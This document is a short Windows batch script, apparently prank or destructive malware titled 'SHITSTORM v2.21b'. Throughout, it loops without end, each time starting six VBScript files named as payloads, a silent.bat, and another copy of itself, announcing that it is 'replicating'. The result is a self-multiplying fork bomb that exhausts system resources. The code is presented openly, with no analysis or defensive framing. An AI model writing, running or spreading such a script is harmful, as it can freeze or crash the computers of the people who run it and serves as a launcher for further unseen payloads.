@echo off

title SHITSTORM v2.21b

echo SHITSTORM_STATUS: OK&& echo.
echo SHITSTORM_VERSION: 2.21b&& echo.
echo STARTING...&& echo.

:die
echo Starting silent.bat...
start silent.bat
echo Starting payload 1...
start payload_1.vbs
echo Starting payload 2...
start payload_2.vbs
echo Starting payload 3...
start payload_3.vbs
echo Starting payload 4...
start payload_4.vbs
echo Starting payload 5...
start payload_5.vbs
echo Starting payload 6...
start payload_6.vbs
echo 6 payloads loaded.
echo Shitstorm is now replicating...
start shitstorm.bat
echo Looping initiated.
goto die
